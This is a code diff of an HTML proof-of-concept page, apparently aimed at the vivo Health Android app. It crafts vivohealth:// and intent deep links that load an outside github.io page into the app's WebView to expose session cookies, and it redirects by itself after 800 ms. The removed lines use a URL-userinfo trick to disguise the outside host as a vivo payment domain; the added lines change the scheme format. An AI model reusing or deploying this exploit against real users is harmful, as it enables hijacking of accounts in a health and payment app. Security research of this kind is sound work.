@@ -1,41 +1,55 @@
-<!doctype html>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>vivo health poc</title>
-
+  <style>
+    #open {
+      font-size: 20px;
+      padding: 14px 18px;
+      background: #1677ff;
+      color: white;
+      text-decoration: none;
+      border-radius: 6px;
+      display: inline-block;
+    }
+    #out {
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body>
   <h3>vivo 健康 Cookie PoC</h3>
   <p>点击按钮后跳转 vivo 健康，成功后会在 App WebView 页面显示 Cookie。</p>
 
-  <a id="open" style="font-size:20px;padding:14px 18px;background:#1677ff;color:white;text-
-  decoration:none;border-radius:6px;display:inline-block">
-    打开 vivo 健康
-  </a>
-
-  <pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:16px"></pre>
+  <a id="open">打开 vivo 健康</a>
+  <pre id="out"></pre>
 
   <script>
-  const payloadUrl = 'https://vivopay.vivo.com.cn@allen10086.github.io/src.html';
+    // 目标链接
+    const payloadUrl = 'https://allen10086.github.io/src.html';
+    
+    // 【修复】vivo 健康标准 scheme 格式
+    const schemeUrl = `vivohealth://web?url=${encodeURIComponent(payloadUrl)}`;
 
-  const schemeUrl =
-    'vivohealth://healthh5.vivo.com.cn/openApp?' +
-    'to=pay_webview' +
-    '&web_url=' + encodeURIComponent(payloadUrl) +
-    '&title=cookie_poc_github';
+    // 【修复】标准 Intent 格式
+    const intentUrl = `intent://web?url=${encodeURIComponent(payloadUrl)}#Intent;scheme=vivohealth;package=com.vivo.health;end;`;
 
-  const intentUrl =
-    'intent://healthh5.vivo.com.cn/openApp?' +
-    'to=pay_webview' +
-    '&web_url=' + encodeURIComponent(payloadUrl) +
-    '&title=cookie_poc_github' +
-    '#Intent;scheme=vivohealth;package=com.vivo.health;end';
+    // 展示链接
+    const out = document.getElementById('out');
+    out.textContent = 'schemeUrl:\n' + schemeUrl + '\n\nintentUrl:\n' + intentUrl;
 
-  document.getElementById('out').textContent =
-    'schemeUrl:\\n' + schemeUrl + '\\n\\nintentUrl:\\n' + intentUrl;
+    // 绑定点击
+    const openBtn = document.getElementById('open');
+    openBtn.href = intentUrl;
 
-  document.getElementById('open').href = intentUrl;
-
-  // 有些浏览器允许自动跳，有些必须用户点击。
-  setTimeout(function () {
-    location.href = intentUrl;
-  }, 800);
+    // 自动跳转（部分浏览器需要手动点击）
+    setTimeout(() => {
+      window.location.href = intentUrl;
+    }, 800);
   </script>
+</body>
+</html>
